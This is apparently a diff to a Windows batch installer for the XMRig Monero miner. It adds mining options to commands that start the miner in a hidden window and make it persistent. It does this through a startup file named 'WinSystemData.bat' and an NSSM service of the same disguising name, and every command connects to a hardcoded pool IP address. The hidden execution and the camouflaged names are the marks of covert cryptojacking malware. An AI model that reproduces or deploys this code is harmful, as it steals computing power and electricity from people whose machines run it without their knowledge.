@@ -164,10 +164,10 @@ exit /b 1
 :STARTUP_DIR_OK
 (
 echo @echo off
-echo start /min /b "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background
+echo start /min /b "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background --keepalive --cpu-memory-pool=-1 --asm=auto -a rx/0 --coin=monero
 ) > "%STARTUP_DIR%\WinSystemData.bat"
 
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\xmrig.exe' -ArgumentList '-o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\xmrig.exe' -ArgumentList '-o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background --keepalive --cpu-memory-pool=-1 --asm=auto -a rx/0 --coin=monero' -WindowStyle Hidden"
 goto OK
 
 :ADMIN_MINER_SETUP
@@ -204,7 +204,7 @@ if not exist "%MINER_DIR%\xmrig.exe" (
   exit /b 1
 )
 
-"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background
+"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background --keepalive --cpu-memory-pool=-1 --asm=auto -a rx/0 --coin=monero
 if errorlevel 1 (
   exit /b 1
 )
